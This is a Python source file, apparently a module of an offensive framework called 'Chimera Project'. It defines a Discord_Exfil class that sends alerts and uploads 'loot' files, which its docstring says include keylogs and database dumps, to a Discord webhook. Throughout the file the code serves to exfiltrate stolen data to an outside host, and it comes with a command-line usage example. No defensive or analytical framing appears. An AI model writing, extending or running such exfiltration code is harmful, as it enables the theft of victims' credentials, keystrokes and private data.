import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import requests # pip install requests
import logging

# GPS Line
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Discord_Exfil:
    def __init__(self):
        self.agent_id = "79"
        self.name = "Discord_Exfil"
        self.db = ChimeraDB()
        # REPLACE THIS with your actual Discord Webhook URL
        self.webhook_url = "https://discord.com/api/webhooks/YOUR_ID_HERE"

    def send_alert(self, message):
        """Sends a text-based alert to the Discord channel."""
        data = {"content": f"🚀 **CHIMERA ALERT:** {message}"}
        try:
            requests.post(self.webhook_url, json=data)
        except Exception as e:
            self.logger.error(f"Discord Alert Failed: {e}")

    def upload_file(self, file_path):
        """Uploads a loot file (like a keylog or database dump)."""
        if not os.path.exists(file_path):
            return
            
        try:
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                requests.post(self.webhook_url, files=files)
            self.logger.info(f"[+] Loot exfiltrated: {file_path}")
        except Exception as e:
            self.logger.error(f"Discord File Upload Failed: {e}")

    def run(self, target_file=None):
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO)
        self.logger = logging.getLogger(self.name)
        
        self.db.heartbeat(self.name)
        
        if target_file:
            self.send_alert(f"Exfiltrating sensitive loot: {os.path.basename(target_file)}")
            self.upload_file(target_file)
        
        self.db.close()

if __name__ == "__main__":
    # Example: python3 main.py /path/to/loot.txt
    file_to_send = sys.argv[1] if len(sys.argv) > 1 else None
    agent = Discord_Exfil()
    agent.run(file_to_send)
